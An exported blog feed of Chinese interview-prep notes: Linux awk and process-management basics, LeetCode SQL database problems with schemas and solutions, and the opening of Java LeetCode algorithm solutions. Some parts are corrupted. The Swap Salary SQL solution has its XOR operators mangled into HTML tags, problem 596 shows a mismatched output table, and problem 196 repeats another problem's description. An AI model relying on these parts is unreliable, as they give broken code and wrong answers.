文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。 1234$ cat /etc/passwd | awk &apos;BEGIN &#123;FS=&quot;:&quot;&#125; $3 &lt; 10 &#123;print $1 &quot;\t &quot; $3&#125;&apos;root 0bin 1daemon 2 awk 变量： 变量名称 代表意义 NF 每一行拥有的字段总数 NR 目前所处理的是第几行数据 FS 目前的分隔字符，默认是空格键 示例 3：输出正在处理的行号，并显示每一行有多少字段 123456$ last -n 5 | awk '&#123;print $1 "\t lines: " NR "\t columns: " NF&#125;'dmtsai lines: 1 columns: 10dmtsai lines: 2 columns: 10dmtsai lines: 3 columns: 10dmtsai lines: 4 columns: 10dmtsai lines: 5 columns: 9 十、进程管理查看进程1. ps查看某个时间点的进程信息 示例一：查看自己的进程 1# ps -l 示例二：查看系统所有进程 1# ps aux 示例三：查看特定的进程 1# ps aux | grep threadx 2. top实时显示进程信息 示例：两秒钟刷新一次 1# top -d 2 3. pstree查看进程树 示例：查看所有进程树 1# pstree -A 4. netstat查看占用端口的进程 示例：查看特定端口的进程 1# netstat -anp | grep port 进程状态 状态 说明 R running or runnable (on run queue) D uninterruptible sleep (usually I/O) S interruptible sleep (waiting for an event to complete) Z zombie (terminated but not reaped by its parent) T stopped (either by a job control signal or because it is being traced) SIGCHLD当一个子进程改变了它的状态时：停止运行，继续运行或者退出，有两件事会发生在父进程中： 得到 SIGCHLD 信号； waitpid() 或者 wait() 调用会返回。 其中子进程发送的 SIGCHLD 信号包含了子进程的信息，包含了进程 ID、进程状态、进程使用 CPU 的时间等。 在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息。父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。 wait()1pid_t wait(int *status) 父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。 如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时 errno 被置为 ECHILD。 参数 status 用来保存被收集的子进程退出时的一些状态，如果我们对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为 NULL： 1pid = wait(NULL); waitpid()1pid_t waitpid(pid_t pid, int *status, int options) 作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。 pid 参数指示一个子进程的 ID，表示只关心这个子进程的退出 SIGCHLD 信号。如果 pid=-1 时，那么和 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。 options 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。 孤儿进程一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。 孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。 由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。 僵尸进程一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。 僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。 系统所能使用的进程号是有限的，如果大量的产生僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。 要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时所有的僵尸进程就会变成孤儿进程，从而被 init 所收养，这样 init 就会释放所有的僵死进程所占有的资源，从而结束僵尸进程。 参考资料 鸟哥. 鸟 哥 的 Linux 私 房 菜 基 础 篇 第 三 版[J]. 2009. Linux 平台上的软件包管理 Linux 之守护进程、僵死进程与孤儿进程 What is the difference between a symbolic link and a hard link? Linux process states GUID Partition Table 详解 wait 和 waitpid 函数 IDE、SATA、SCSI、SAS、FC、SSD 硬盘类型介绍 Akai IB-301S SCSI Interface for S2800,S3000 Parallel ATA ADATA XPG SX900 256GB SATA 3 SSD Review – Expanded Capacity and SandForce Driven Speed Decoding UCS Invicta – Part 1 硬盘 Difference between SAS and SATA BIOS File system design case studies Programming Project #4 FILE SYSTEM DESIGN]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-Database 题解]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FLeetcode-Database%20%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[595. Big Countries 627. Swap Salary 620. Not Boring Movies 596. Classes More Than 5 Students 182. Duplicate Emails 196. Delete Duplicate Emails 175. Combine Two Tables 181. Employees Earning More Than Their Managers 183. Customers Who Never Order 184. Department Highest Salary 176. Second Highest Salary 177. Nth Highest Salary 178. Rank Scores 180. Consecutive Numbers 626. Exchange Seats 595. Big Countrieshttps://leetcode.com/problems/big-countries/description/ Description123456789+-----------------+------------+------------+--------------+---------------+| name | continent | area | population | gdp |+-----------------+------------+------------+--------------+---------------+| Afghanistan | Asia | 652230 | 25500100 | 20343000 || Albania | Europe | 28748 | 2831741 | 12960000 || Algeria | Africa | 2381741 | 37100000 | 188681000 || Andorra | Europe | 468 | 78115 | 3712000 || Angola | Africa | 1246700 | 20609294 | 100990000 |+-----------------+------------+------------+--------------+---------------+ 查找面积超过 3,000,000 或者人口数超过 25,000,000 的国家。 123456+--------------+-------------+--------------+| name | population | area |+--------------+-------------+--------------+| Afghanistan | 25500100 | 652230 || Algeria | 37100000 | 2381741 |+--------------+-------------+--------------+ SQL Schema1234567891011DROP TABLEIF EXISTS World;CREATE TABLE World ( NAME VARCHAR ( 255 ), continent VARCHAR ( 255 ), area INT, population INT, gdp INT );INSERT INTO World ( NAME, continent, area, population, gdp )VALUES ( 'Afghanistan', 'Asia', '652230', '25500100', '203430000' ), ( 'Albania', 'Europe', '28748', '2831741', '129600000' ), ( 'Algeria', 'Africa', '2381741', '37100000', '1886810000' ), ( 'Andorra', 'Europe', '468', '78115', '37120000' ), ( 'Angola', 'Africa', '1246700', '20609294', '1009900000' ); Solution12345678SELECT name, population, areaFROM WorldWHERE area &gt; 3000000 OR population &gt; 25000000; 627. Swap Salaryhttps://leetcode.com/problems/swap-salary/description/ Description123456| id | name | sex | salary ||----|------|-----|--------|| 1 | A | m | 2500 || 2 | B | f | 1500 || 3 | C | m | 5500 || 4 | D | f | 500 | 只用一个 SQL 查询，将 sex 字段反转。 123456| id | name | sex | salary ||----|------|-----|--------|| 1 | A | f | 2500 || 2 | B | m | 1500 || 3 | C | f | 5500 || 4 | D | m | 500 | SQL Schema12345678910DROP TABLEIF EXISTS salary;CREATE TABLE salary ( id INT, NAME VARCHAR ( 100 ), sex CHAR ( 1 ), salary INT );INSERT INTO salary ( id, NAME, sex, salary )VALUES ( '1', 'A', 'm', '2500' ), ( '2', 'B', 'f', '1500' ), ( '3', 'C', 'm', '5500' ), ( '4', 'D', 'f', '500' ); Solution12UPDATE salarySET sex = CHAR ( ASCII(sex) &lt;sup&gt; ASCII( 'm' ) &lt;/sup&gt; ASCII( 'f' ) ); 620. Not Boring Movieshttps://leetcode.com/problems/not-boring-movies/description/ Description123456789+---------+-----------+--------------+-----------+| id | movie | description | rating |+---------+-----------+--------------+-----------+| 1 | War | great 3D | 8.9 || 2 | Science | fiction | 8.5 || 3 | irish | boring | 6.2 || 4 | Ice song | Fantacy | 8.6 || 5 | House card| Interesting| 9.1 |+---------+-----------+--------------+-----------+ 查找 id 为奇数，并且 description 不是 boring 的电影，按 rating 降序。 123456+---------+-----------+--------------+-----------+| id | movie | description | rating |+---------+-----------+--------------+-----------+| 5 | House card| Interesting| 9.1 || 1 | War | great 3D | 8.9 |+---------+-----------+--------------+-----------+ SQL Schema1234567891011DROP TABLEIF EXISTS cinema;CREATE TABLE cinema ( id INT, movie VARCHAR ( 255 ), description VARCHAR ( 255 ), rating FLOAT ( 2, 1 ) );INSERT INTO cinema ( id, movie, description, rating )VALUES ( 1, 'War', 'great 3D', 8.9 ), ( 2, 'Science', 'fiction', 8.5 ), ( 3, 'irish', 'boring', 6.2 ), ( 4, 'Ice song', 'Fantacy', 8.6 ), ( 5, 'House card', 'Interesting', 9.1 ); Solution123456789SELECT *FROM cinemaWHERE id % 2 = 1 AND description != 'boring'ORDER BY rating DESC; 596. Classes More Than 5 Studentshttps://leetcode.com/problems/classes-more-than-5-students/description/ Description12345678910111213+---------+------------+| student | class |+---------+------------+| A | Math || B | English || C | Math || D | Biology || E | Math || F | Computer || G | Math || H | Math || I | Math |+---------+------------+ 查找有五名及以上 student 的 class。 12345+---------+| Email |+---------+| a@b.com |+---------+ SQL Schema123456789101112131415DROP TABLEIF EXISTS courses;CREATE TABLE courses ( student VARCHAR ( 255 ), class VARCHAR ( 255 ) );INSERT INTO courses ( student, class )VALUES ( 'A', 'Math' ), ( 'B', 'English' ), ( 'C', 'Math' ), ( 'D', 'Biology' ), ( 'E', 'Math' ), ( 'F', 'Computer' ), ( 'G', 'Math' ), ( 'H', 'Math' ), ( 'I', 'Math' ); Solution12345678SELECT classFROM coursesGROUP BY classHAVING count( DISTINCT student ) &gt;= 5; 182. Duplicate Emailshttps://leetcode.com/problems/duplicate-emails/description/ Description邮件地址表： 1234567+----+---------+| Id | Email |+----+---------+| 1 | a@b.com || 2 | c@d.com || 3 | a@b.com |+----+---------+ 查找重复的邮件地址： 12345+---------+| Email |+---------+| a@b.com |+---------+ SQL Schema123456789DROP TABLEIF EXISTS Person;CREATE TABLE Person ( Id INT, Email VARCHAR ( 255 ) );INSERT INTO Person ( Id, Email )VALUES ( 1, 'a@b.com' ), ( 2, 'c@d.com' ), ( 3, 'a@b.com' ); Solution12345678SELECT EmailFROM PersonGROUP BY EmailHAVING COUNT( * ) &gt;= 2; 196. Delete Duplicate EmailsDescription邮件地址表： 1234567+----+---------+| Id | Email |+----+---------+| 1 | a@b.com || 2 | c@d.com || 3 | a@b.com |+----+---------+ 查找重复的邮件地址： 12345+---------+| Email |+---------+| a@b.com |+---------+ SQL Schema与 182 相同。 Solution连接： 1234567DELETE p1FROM Person p1, Person p2WHERE p1.Email = p2.Email AND p1.Id &gt; p2.Id 子查询： 12345DELETEFROM PersonWHERE id NOT IN ( SELECT id FROM ( SELECT min( id ) AS id FROM Person GROUP BY email ) AS m ); 应该注意的是上述解法额外嵌套了一个 SELECT 语句，如果不这么做，会出现错误：You can’t specify target table ‘Person’ for update in FROM clause。以下演示了这种错误解法。 12345DELETEFROM PersonWHERE id NOT IN ( SELECT min( id ) AS id FROM Person GROUP BY email ); 参考：pMySQL Error 1093 - Can’t specify target table for update in FROM clause 175. Combine Two Tableshttps://leetcode.com/problems/combine-two-tables/description/ DescriptionPerson 表： 12345678+-------------+---------+| Column Name | Type |+-------------+---------+| PersonId | int || FirstName | varchar || LastName | varchar |+-------------+---------+PersonId is the primary key column for this table. Address 表： 123456789+-------------+---------+| Column Name | Type |+-------------+---------+| AddressId | int || PersonId | int || City | varchar || State | varchar |+-------------+---------+AddressId is the primary key column for this table. 查找 FirstName, LastName, City, State 数据，而不管一个用户有没有填地址信息。 SQL Schema1234567891011121314DROP TABLEIF EXISTS Person;CREATE TABLE Person ( PersonId INT, FirstName VARCHAR ( 255 ), LastName VARCHAR ( 255 ) );DROP TABLEIF EXISTS Address;CREATE TABLE Address ( AddressId INT, PersonId INT, City VARCHAR ( 255 ), State VARCHAR ( 255 ) );INSERT INTO Person ( PersonId, LastName, FirstName )VALUES ( 1, 'Wang', 'Allen' );INSERT INTO Address ( AddressId, PersonId, City, State )VALUES ( 1, 2, 'New York City', 'New York' ); Solution使用左外连接。 12345678SELECT FirstName, LastName, City, StateFROM Person P LEFT JOIN Address AS A ON P.PersonId = A.PersonId; 181. Employees Earning More Than Their Managershttps://leetcode.com/problems/employees-earning-more-than-their-managers/description/ DescriptionEmployee 表： 12345678+----+-------+--------+-----------+| Id | Name | Salary | ManagerId |+----+-------+--------+-----------+| 1 | Joe | 70000 | 3 || 2 | Henry | 80000 | 4 || 3 | Sam | 60000 | NULL || 4 | Max | 90000 | NULL |+----+-------+--------+-----------+ 查找所有员工，他们的薪资大于其经理薪资。 SQL Schema12345678910DROP TABLEIF EXISTS Employee;CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, ManagerId INT );INSERT INTO Employee ( Id, NAME, Salary, ManagerId )VALUES ( 1, 'Joe', 70000, 3 ), ( 2, 'Henry', 80000, 4 ), ( 3, 'Sam', 60000, NULL ), ( 4, 'Max', 90000, NULL ); Solution123456SELECT E1.NAME AS EmployeeFROM Employee E1 INNER JOIN Employee E2 ON E1.ManagerId = E2.Id AND E1.Salary &gt; E2.Salary; 183. Customers Who Never Orderhttps://leetcode.com/problems/customers-who-never-order/description/ DescriptionCurstomers 表： 12345678+----+-------+| Id | Name |+----+-------+| 1 | Joe || 2 | Henry || 3 | Sam || 4 | Max |+----+-------+ Orders 表： 123456+----+------------+| Id | CustomerId |+----+------------+| 1 | 3 || 2 | 1 |+----+------------+ 查找没有订单的顾客信息： 123456+-----------+| Customers |+-----------+| Henry || Max |+-----------+ SQL Schema123456789101112131415161718DROP TABLEIF EXISTS Customers;CREATE TABLE Customers ( Id INT, NAME VARCHAR ( 255 ) );DROP TABLEIF EXISTS Orders;CREATE TABLE Orders ( Id INT, CustomerId INT );INSERT INTO Customers ( Id, NAME )VALUES ( 1, 'Joe' ), ( 2, 'Henry' ), ( 3, 'Sam' ), ( 4, 'Max' );INSERT INTO Orders ( Id, CustomerId )VALUES ( 1, 3 ), ( 2, 1 ); Solution左外链接 1234567SELECT C.Name AS CustomersFROM Customers C LEFT JOIN Orders O ON C.Id = O.CustomerIdWHERE O.CustomerId IS NULL; 子查询 123456SELECT Name AS CustomersFROM CustomersWHERE Id NOT IN ( SELECT CustomerId FROM Orders ); 184. Department Highest Salaryhttps://leetcode.com/problems/department-highest-salary/description/ DescriptionEmployee 表： 12345678+----+-------+--------+--------------+| Id | Name | Salary | DepartmentId |+----+-------+--------+--------------+| 1 | Joe | 70000 | 1 || 2 | Henry | 80000 | 2 || 3 | Sam | 60000 | 2 || 4 | Max | 90000 | 1 |+----+-------+--------+--------------+ Department 表： 123456+----+----------+| Id | Name |+----+----------+| 1 | IT || 2 | Sales |+----+----------+ 查找一个 Department 中收入最高者的信息： 123456+------------+----------+--------+| Department | Employee | Salary |+------------+----------+--------+| IT | Max | 90000 || Sales | Henry | 80000 |+------------+----------+--------+ SQL Schema1234567891011121314DROP TABLE IF EXISTS Employee;CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, DepartmentId INT );DROP TABLE IF EXISTS Department;CREATE TABLE Department ( Id INT, NAME VARCHAR ( 255 ) );INSERT INTO Employee ( Id, NAME, Salary, DepartmentId )VALUES ( 1, 'Joe', 70000, 1 ), ( 2, 'Henry', 80000, 2 ), ( 3, 'Sam', 60000, 2 ), ( 4, 'Max', 90000, 1 );INSERT INTO Department ( Id, NAME )VALUES ( 1, 'IT' ), ( 2, 'Sales' ); Solution创建一个临时表，包含了部门员工的最大薪资。可以对部门进行分组，然后使用 MAX() 汇总函数取得最大薪资。 之后使用连接找到一个部门中薪资等于临时表中最大薪资的员工。 123456789101112SELECT D.NAME Department, E.NAME Employee, E.SalaryFROM Employee E, Department D, ( SELECT DepartmentId, MAX( Salary ) Salary FROM Employee GROUP BY DepartmentId ) MWHERE E.DepartmentId = D.Id AND E.DepartmentId = M.DepartmentId AND E.Salary = M.Salary; 176. Second Highest Salaryhttps://leetcode.com/problems/second-highest-salary/description/ Description1234567+----+--------+| Id | Salary |+----+--------+| 1 | 100 || 2 | 200 || 3 | 300 |+----+--------+ 查找工资第二高的员工。 12345+---------------------+| SecondHighestSalary |+---------------------+| 200 |+---------------------+ 如果没有找到，那么就返回 null 而不是不返回数据。 SQL Schema123456789DROP TABLEIF EXISTS Employee;CREATE TABLE Employee ( Id INT, Salary INT );INSERT INTO Employee ( Id, Salary )VALUES ( 1, 100 ), ( 2, 200 ), ( 3, 300 ); Solution为了在没有查找到数据时返回 null，需要在查询结果外面再套一层 SELECT。 12SELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT 1, 1 ) SecondHighestSalary; 177. Nth Highest SalaryDescription查找工资第 N 高的员工。 SQL Schema同 176。 Solution123456CREATE FUNCTION getNthHighestSalary ( N INT ) RETURNS INT BEGINSET N = N - 1;RETURN ( SELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT N, 1 ) );END 178. Rank Scoreshttps://leetcode.com/problems/rank-scores/description/ Description得分表： 12345678910+----+-------+| Id | Score |+----+-------+| 1 | 3.50 || 2 | 3.65 || 3 | 4.00 || 4 | 3.85 || 5 | 4.00 || 6 | 3.65 |+----+-------+ 将得分排序，并统计排名。 12345678910+-------+------+| Score | Rank |+-------+------+| 4.00 | 1 || 4.00 | 1 || 3.85 | 2 || 3.65 | 3 || 3.65 | 3 || 3.50 | 4 |+-------+------+ SQL Schema123456789101112DROP TABLEIF EXISTS Scores;CREATE TABLE Scores ( Id INT, Score DECIMAL ( 3, 2 ) );INSERT INTO Scores ( Id, Score )VALUES ( 1, 3.5 ), ( 2, 3.65 ), ( 3, 4.0 ), ( 4, 3.85 ), ( 5, 4.0 ), ( 6, 3.65 ); Solution12345678910SELECT S1.score, COUNT( DISTINCT S2.score ) RankFROM Scores S1 INNER JOIN Scores S2 ON S1.score &lt;= S2.scoreGROUP BY S1.idORDER BY S1.score DESC; 180. Consecutive Numbershttps://leetcode.com/problems/consecutive-numbers/description/ Description数字表： 1234567891011+----+-----+| Id | Num |+----+-----+| 1 | 1 || 2 | 1 || 3 | 1 || 4 | 2 || 5 | 1 || 6 | 2 || 7 | 2 |+----+-----+ 查找连续出现三次的数字。 12345+-----------------+| ConsecutiveNums |+-----------------+| 1 |+-----------------+ SQL Schema12345678910111213DROP TABLEIF EXISTS LOGS;CREATE TABLE LOGS ( Id INT, Num INT );INSERT INTO LOGS ( Id, Num )VALUES ( 1, 1 ), ( 2, 1 ), ( 3, 1 ), ( 4, 2 ), ( 5, 1 ), ( 6, 2 ), ( 7, 2 ); Solution12345678910SELECT DISTINCT L1.num ConsecutiveNumsFROM Logs L1, Logs L2, Logs L3WHERE L1.id = l2.id - 1 AND L2.id = L3.id - 1 AND L1.num = L2.num AND l2.num = l3.num; 626. Exchange Seatshttps://leetcode.com/problems/exchange-seats/description/ Descriptionseat 表存储着座位对应的学生。 123456789+---------+---------+| id | student |+---------+---------+| 1 | Abbot || 2 | Doris || 3 | Emerson || 4 | Green || 5 | Jeames |+---------+---------+ 要求交换相邻座位的两个学生，如果最后一个座位是奇数，那么不交换这个座位上的学生。 123456789+---------+---------+| id | student |+---------+---------+| 1 | Doris || 2 | Abbot || 3 | Green || 4 | Emerson || 5 | Jeames |+---------+---------+ SQL Schema1234567891011DROP TABLEIF EXISTS seat;CREATE TABLE seat ( id INT, student VARCHAR ( 255 ) );INSERT INTO seat ( id, student )VALUES ( '1', 'Abbot' ), ( '2', 'Doris' ), ( '3', 'Emerson' ), ( '4', 'Green' ), ( '5', 'Jeames' ); Solution使用多个 union。 12345678910111213141516171819202122232425SELECT s1.id - 1 AS id, s1.student FROM seat s1 WHERE s1.id MOD 2 = 0 UNIONSELECT s2.id + 1 AS id, s2.student FROM seat s2 WHERE s2.id MOD 2 = 1 AND s2.id != ( SELECT max( s3.id ) FROM seat s3 ) UNIONSELECT s4.id AS id, s4.student FROM seat s4 WHERE s4.id MOD 2 = 1 AND s4.id = ( SELECT max( s5.id ) FROM seat s5 ) ORDER BY id;]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 题解]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FLeetcode%20%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[算法思想 贪心思想 双指针 排序 快速选择 堆排序 桶排序 荷兰国旗问题 二分查找 搜索 BFS DFS Backtracking 分治 动态规划 斐波那契数列 矩阵路径 数组区间 分割整数 最长递增子序列 最长公共子序列 0-1 背包 股票交易 字符串编辑 数学 素数 最大公约数 进制转换 阶乘 字符串加法减法 相遇问题 多数投票问题 其它 数据结构相关 栈和队列 哈希表 字符串 数组与矩阵 链表 树 递归 层次遍历 前中后序遍历 BST Trie 图 二分图 拓扑排序 并查集 位运算 参考资料 算法思想贪心思想贪心思想保证每次操作都是局部最优的，并且最后得到的结果是全局最优的。 分配饼干 455. Assign Cookies (Easy) 123456Input: [1,2], [1,2,3]Output: 2Explanation: You have 2 children and 3 cookies. The greed factors of 2 children are 1, 2.You have 3 cookies and their sizes are big enough to gratify all of the children,You need to output 2. 题目描述：每个孩子都有一个满足度，每个饼干都有一个大小，只有饼干的大小大于等于一个孩子的满足度，该孩子才会获得满足。求解最多可以获得满足的孩子数量。 因为最小的孩子最容易得到满足，因此先满足最小孩子。给一个孩子的饼干应当尽量小又能满足该孩子，这样大饼干就能拿来给满足度比较大的孩子。因此贪心策略 证明：假设在某次选择中，贪心策略选择给当前满足度最小的孩子分配第 m 个饼干，第 m 个饼干为可以满足该孩子的最小饼干。假设存在一种最优策略，给该孩子分配第 n 个饼干，并且 m &lt; n。我们可以发现，经过这一轮分配，贪心策略分配后剩下的饼干一定有一个比最优策略来得大。因此在后续的分配中，贪心策略一定能满足更多的孩子。也就是说不存在比贪心策略更优的策略，即贪心策略就是最优策略。 123456789101112public int findContentChildren(int[] g, int[] s) &#123; Arrays.sort(g); Arrays.sort(s); int gi = 0, si = 0; while (gi &lt; g.length &amp;&amp; si &lt; s.length) &#123; if (g[gi] &lt;= s[si]) &#123; gi++; &#125; si++; &#125; return gi;&#125; 不重叠的区间个数 435. Non-overlapping Intervals (Medium) 12345Input: [ [1,2], [1,2], [1,2] ]Output: 2Explanation: You need to remove two [1,2] to make the rest of intervals non-overlapping. 12345Input: [ [1,2], [2,3] ]Output: 0Explanation: You don't need to remove any of the intervals since they're already non-overlapping. 题目描述：计算让一组区间不重叠所需要移除的区间个数。 计算最多能组成的不重叠区间个数，然后用区间总个数减去不重叠区间的个数。 在每次选择中，区间的结尾最为重要，选择的区间结尾越小，留给后面的区间的空间越大，那么后面能够选择的区间个数也就越大。 按区间的结尾进行排序，每次选择结尾最小，并且和前一个区间不重叠的区间。 12345678910111213141516public int eraseOverlapIntervals(Interval[] intervals) &#123; if (intervals.length == 0) &#123; return 0; &#125; Arrays.sort(intervals, Comparator.comparingInt(o -&gt; o.end)); int cnt = 1; int end = intervals[0].end; for (int i = 1; i &lt; intervals.length; i++) &#123; if (intervals[i].start &lt; end) &#123; continue; &#125; end = intervals[i].end; cnt++; &#125; return intervals.length - cnt;&#125; 使用 lambda 表示式创建 Comparator 会导致算法运行时间过长，如果注重运行时间，可以修改为普通创建 Comparator 语句： 123456Arrays.sort(intervals, new Comparator&lt;Interval&gt;() &#123; @Override public int compare(Interval o1, Interval o2) &#123; return o1.end - o2.end; &#125;&#125;); 投飞镖刺破气球 452. Minimum Number of Arrows to Burst Balloons (Medium) 12345Input:[[10,16], [2,8], [1,6], [7,12]]Output:2 题目描述：气球在一个水平数轴上摆放，可以重叠，飞镖垂直投向坐标轴，使得路径上的气球都会刺破。求解最小的投飞镖次数使所有气球都被刺破。 也是计算不重叠的区间个数，不过和 Non-overlapping Intervals 的区别在于，[1, 2] 和 [2, 3] 在本题中算是重叠区间。 123456789101112131415public int findMinArrowShots(int[][] points) &#123; if (points.length == 0) &#123; return 0; &#125; Arrays.sort(points, Comparator.comparingInt(o -&gt; o[1])); int cnt = 1, end = points[0][1]; for (int i = 1; i &lt; points.length; i++) &#123; if (points[i][0] &lt;= end) &#123; continue; &#125; cnt++; end = points[i][1]; &#125; return cnt;&#125; 根据身高和序号重组队列 406. Queue Reconstruction by Height(Medium) 12345Input:[[7,0], [4,4], [7,1], [5,0], [6,1], [5,2]]Output:[[5,0], [7,0], [5,2], [6,1], [4,4], [7,1]] 题目描述：一个学生用两个分量 (h, k) 描述，h 表示身高，k 表示排在前面的有 k 个学生的身高比他高或者和他一样高。 为了在每次插入操作时不影响后续的操作，身高较高的学生应该先做插入操作，否则身高较小的学生原先正确插入第 k 个位置可能会变成第 k+1 个位置。 身高降序、k 值升序，然后按排好序的顺序插入队列的第 k 个位置中。 1234567891011public int[][] reconstructQueue(int[][] people) &#123; if (people == null || people.length == 0 || people[0].length == 0) &#123; return new int[0][0]; &#125; Arrays.sort(people, (a, b) -&gt; (a[0] == b[0] ? a[1] - b[1] : b[0] - a[0])); List&lt;int[]&gt; queue = new ArrayList&lt;&gt;(); for (int[] p : people) &#123; queue.add(p[1], p); &#125; return queue.toArray(new int[queue.size()][]);&#125; 分隔字符串使同种字符出现在一起 763. Partition Labels (Medium) 123456Input: S = "ababcbacadefegdehijhklij"Output: [9,7,8]Explanation:The partition is "ababcbaca", "defegde", "hijhklij".This is a partition so that each letter appears in at most one part.A partition like "ababcbacadefegde", "hijhklij" is incorrect, because it splits S into less parts. 123456789101112131415161718192021222324public List&lt;Integer&gt; partitionLabels(String S) &#123; int[] lastIndexsOfChar = new int[26]; for (int i = 0; i &lt; S.length(); i++) &#123; lastIndexsOfChar[char2Index(S.charAt(i))] = i; &#125; List&lt;Integer&gt; partitions = new ArrayList&lt;&gt;(); int firstIndex = 0; while (firstIndex &lt; S.length()) &#123; int lastIndex = firstIndex; for (int i = firstIndex; i &lt; S.length() &amp;&amp; i &lt;= lastIndex; i++) &#123; int index = lastIndexsOfChar[char2Index(S.charAt(i))]; if (index &gt; lastIndex) &#123; lastIndex = index; &#125; &#125; partitions.add(lastIndex - firstIndex + 1); firstIndex = lastIndex + 1; &#125; return partitions;&#125;private int char2Index(char c) &#123; return c - 'a';&#125; 种植花朵 605. Can Place Flowers (Easy) 12Input: flowerbed = [1,0,0,0,1], n = 1Output: True 题目描述：花朵之间至少需要一个单位的间隔，求解是否能种下 n 朵花。 12345678910111213141516public boolean canPlaceFlowers(int[] flowerbed, int n) &#123; int len = flowerbed.length; int cnt = 0; for (int i = 0; i &lt; len &amp;&amp; cnt &lt; n; i++) &#123; if (flowerbed[i] == 1) &#123; continue; &#125; int pre = i == 0 ? 0 : flowerbed[i - 1]; int next = i == len - 1 ? 0 : flowerbed[i + 1]; if (pre == 0 &amp;&amp; next == 0) &#123; cnt++; flowerbed[i] = 1; &#125; &#125; return cnt &gt;= n;&#125; 判断是否为子序列 392. Is Subsequence (Medium) 12s = "abc", t = "ahbgdc"Return true. 12345678910public boolean isSubsequence(String s, String t) &#123; int index = -1; for (char c : s.toCharArray()) &#123; index = t.indexOf(c, index + 1); if (index == -1) &#123; return false; &#125; &#125; return true;&#125; 修改一个数成为非递减数组 665. Non-decreasing Array (Easy) 123Input: [4,2,3]Output: TrueExplanation: You could modify the first 4 to 1 to get a non-decreasing array. 题目描述：判断一个数组能不能只修改一个数就成为非递减数组。 在出现 nums[i] &lt; nums[i - 1] 时，需要考虑的是应该修改数组的哪个数，使得本次修改能使 i 之前的数组成为非递减数组，并且 不影响后续的操作 。优先考虑令 nums[i - 1] = nums[i]，因为如果修改 nums[i] = nums[i - 1] 的话，那么 nums[i] 这个数会变大，就有可能比 nums[i + 1] 大，从而影响了后续操作。还有一个比较特别的情况就是 nums[i] &lt; nums[i - 2]，只修改 nums[i - 1] = nums[i] 不能使数组成为非递减数组，只能修改 nums[i] = nums[i - 1]。 123456789101112131415public boolean checkPossibility(int[] nums) &#123; int cnt = 0; for (int i = 1; i &lt; nums.length &amp;&amp; cnt &lt; 2; i++) &#123; if (nums[i] &gt;= nums[i - 1]) &#123; continue; &#125; cnt++; if (i - 2 &gt;= 0 &amp;&amp; nums[i - 2] &gt; nums[i]) &#123; nums[i] = nums[i - 1]; &#125; else &#123; nums[i - 1] = nums[i]; &#125; &#125; return cnt &lt;= 1;&#125; 股票的最大收益 122. Best Time to Buy and Sell Stock II (Easy) 题目描述：一次股票交易包含买入和卖出，多个交易之间不能交叉进行。 对于 [a, b, c, d]，如果有 a &lt;= b &lt;= c &lt;= d ，那么最大收益为 d - a。而 d - a = (d - c) + (c - b) + (b - a) ，因此当访问到一个 prices[i] 且 prices[i] - prices[i-1] &gt; 0，那么就把 prices[i] - prices[i-1] 添加到收益中，从而在局部最优的情况下也保证全局最优。 123456789public int maxProfit(int[] prices) &#123; int profit = 0; for (int i = 1; i &lt; prices.length; i++) &#123; if (prices[i] &gt; prices[i - 1]) &#123; profit += (prices[i] - prices[i - 1]); &#125; &#125; return profit;&#125; 双指针双指针主要用于遍历数组，两个指针指向不同的元素，从而协同完成任务。 有序数组的 Two Sum Leetcode ：167. Two Sum II - Input array is sorted (Easy) 12Input: numbers=&#123;2, 7, 11, 15&#125;, target=9Output: index1=1, index2=2 题目描述：在有序数组中找出两个数，使它们的和为 target。 使用双指针，一个指针指向值较小的元素，一个指针指向值较大的元素。指向较小元素的指针从头向尾遍历，指向较大元素的指针从尾向头遍历。 如果两个指针指向元素的和 sum == target，那么得到要求的结果；如果 sum &gt; target，移动较大的元素，使 sum 变小一些；如果 sum &lt; target，移动较小的元素，使 sum 变大一些。 1234567891011121314public int[] twoSum(int[] numbers, int target) &#123; int i = 0, j = numbers.length - 1; while (i &lt; j) &#123; int sum = numbers[i] + numbers[j]; if (sum == target) &#123; return new int[]&#123;i + 1, j + 1&#125;; &#125; else if (sum &lt; target) &#123; i++; &#125; else &#123; j--; &#125; &#125; return null;&#125; 两数平方和 